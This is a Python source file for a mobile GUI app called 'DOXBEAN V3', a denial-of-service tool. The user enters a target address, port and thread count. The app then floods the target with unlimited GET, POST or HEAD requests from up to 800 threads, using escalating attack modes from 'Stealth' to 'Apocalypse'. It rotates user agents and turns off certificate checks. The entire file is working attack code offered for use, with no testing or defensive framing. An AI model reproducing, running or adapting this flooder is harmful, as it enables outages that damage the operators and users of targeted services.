# DOXBEAN V3 - TRUE UNLIMITED Default DEVELOPER
from kivy.lang import Builder
from kivymd.app import MDApp
from kivymd.uix.list import OneLineListItem
from kivy.core.window import Window
from kivy.clock import mainthread
from kivy.metrics import dp, sp
import requests, threading, random, time
from concurrent.futures import ThreadPoolExecutor

Window.clearcolor = (0,0,0,1)
Window.softinput_mode = "below_target"

KV = '''
MDBoxLayout:
    orientation: "vertical"
    padding: dp(15)
    spacing: dp(12)
    md_bg_color: 0,0,0,1

    MDLabel:
        text: "DOXBEAN V3"
        font_size: sp(40)
        bold: True
        halign: "center"
        text_color: 1,0,0,1

    AsyncImage:
        source: "logo.png"
        size_hint_y: None
        height: dp(140)
        allow_stretch: True

    MDTextField:
        id: host
        hint_text: "Target Address / IP"

    MDTextField:
        id: port
        hint_text: "Port"
        text: "80"
        input_filter: "int"

    MDTextField:
        id: threads
        hint_text: "Threads (200-800)"
        text: "600"
        input_filter: "int"

    MDLabel:
        text: "METHOD:"
        text_color: 1, 0.3, 0, 1
        font_size: sp(20)

    BoxLayout:
        orientation: "horizontal"
        spacing: dp(15)
        size_hint_y: None
        height: dp(40)

        MDRectangleFlatButton:
            id: btn_get
            text: "GET"
            on_release: app.set_method("GET")

        MDRectangleFlatButton:
            id: btn_post
            text: "POST"
            on_release: app.set_method("POST")

        MDRectangleFlatButton:
            id: btn_head
            text: "HEAD"
            on_release: app.set_method("HEAD")

    MDLabel:
        text: "MODE:"
        text_color: 1, 0.2, 0, 1
        font_size: sp(22)

    MDRectangleFlatButton:
        id: mode_btn
        text: app.mode
        on_release: app.change_mode()
        md_bg_color: 0.5, 0, 0, 1
        font_size: sp(22)

    MDLabel:
        text: "UNLIMITED ATTACK MODE"
        font_size: sp(18)
        bold: True
        halign: "center"
        text_color: 0,1,0,1

    MDProgressBar:
        id: bar
        value: 0
        color: 1,0,0,1

    MDRectangleFlatButton:
        text: "UNLEASH"
        on_release: app.go()
        md_bg_color: 0.8, 0, 0, 1
        font_size: sp(30)
        size_hint_y: None
        height: dp(60)

    MDRectangleFlatButton:
        text: "STOP"
        on_release: app.stop()
        md_bg_color: 0.9, 0, 0, 1
        size_hint_y: None
        height: dp(60)

    ScrollView:
        size_hint_y: None
        height: dp(122)
        MDList:
            id: log
'''

class DoxApp(MDApp):
    def build(self):
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "Red"
        self.modes = ["Stealth", "Rage", "Overkill", "Apocalypse"]
        self.mode = "Rage"
        self.method = "GET"
        self.attack_running = False
        self.root = Builder.load_string(KV)
        self.update_method_buttons()
        return self.root

    def on_start(self):
        self.engine = Attack(self)
        self.log("[READY] DOXBEAN V3 - TRUE UNLIMITED")

    def change_mode(self):
        idx = (self.modes.index(self.mode) + 1) % len(self.modes)
        self.mode = self.modes[idx]
        self.root.ids.mode_btn.text = self.mode
        self.log(f"[MODE] {self.mode}")

    def update_method_buttons(self):
        active = [1, 0, 0, 1]
        inactive = [0.3, 0, 0, 1]
        self.root.ids.btn_get.md_bg_color = active if self.method == "GET" else inactive
        self.root.ids.btn_post.md_bg_color = active if self.method == "POST" else inactive
        self.root.ids.btn_head.md_bg_color = active if self.method == "HEAD" else inactive

    def set_method(self, method):
        self.method = method
        self.update_method_buttons()
        self.log(f"[METHOD] {method}")

    def go(self):
        if self.attack_running:
            self.log("[WARN] Already attacking!")
            return

        host = self.root.ids.host.text.strip()
        if not host:
            self.log("[ERROR] Enter target!")
            return

        try:
            port = int(self.root.ids.port.text or "80")
            threads = max(100, min(int(self.root.ids.threads.text or "600"), 800))
        except:
            self.log("[ERROR] Invalid port/threads!")
            return

        url = f"http{'s' if port in [443,8443] else ''}://{host}:{port}"

        self.root.ids.log.clear_widgets()
        self.engine.start(url, threads, self.mode, self.method)
        self.attack_running = True
        self.log(f"[UNLEASHED] {self.mode} → {host}:{port}")
        self.log(f"[INFO] UNLIMITED | {threads} threads | Press STOP to end")

    def stop(self):
        self.engine.run = False
        self.attack_running = False
        self.log("[STOPPED] Attack terminated by user")

    @mainthread
    def log(self, msg):
        color = [1,0.5,0.5,1]
        if "ERROR" in msg: color = [1,0.1,0.1,1]
        if "UNLEASHED" in msg: color = [0,1,0,1]
        if "READY" in msg: color = [1,1,0,1]
        self.root.ids.log.add_widget(OneLineListItem(text=msg, text_color=color))

class Attack:
    def __init__(self, app): self.app = app

    def start(self, url, threads, mode, method):
        self.url = url
        self.threads = threads
        self.mode = mode
        self.method = method
        self.run = True
        self.sent = 0
        threading.Thread(target=self.attack, daemon=True).start()

    @mainthread
    def log(self, txt): self.app.log(txt)

    def send(self, _):
        if not self.run: return 0
        try:
            headers = {"User-Agent": random.choice(UA)}
            if self.method == "POST":
                requests.post(self.url, data="flood=A"*2000, timeout=8, headers=headers, verify=False)
            elif self.method == "HEAD":
                requests.head(self.url, timeout=8, headers=headers, verify=False)
            else:
                requests.get(self.url, timeout=8, headers=headers, verify=False)
            return 1
        except:
            return 0

    def attack(self):
        delay = {"Stealth":1.8, "Rage":0.12, "Overkill":0.025, "Apocalypse":0.0006}[self.mode]
        self.log(f"[INFO] {self.threads} threads | {delay}s delay | UNLIMITED")

        with ThreadPoolExecutor(max_workers=self.threads) as exe:
            while self.run:
                done = sum(exe.map(self.send, range(self.threads)))
                self.sent += done
                if done:
                    self.log(f"[SENT] {self.sent:,} requests")
                time.sleep(delay)

        self.log("[FINISHED] Attack stopped")
        self.app.attack_running = False


UA = ["DoxBeanV3-Unlimited", "Mozilla/5.0", "curl/8.8", "Stresser/9999"]

requests.packages.urllib3.disable_warnings()
DoxApp().run()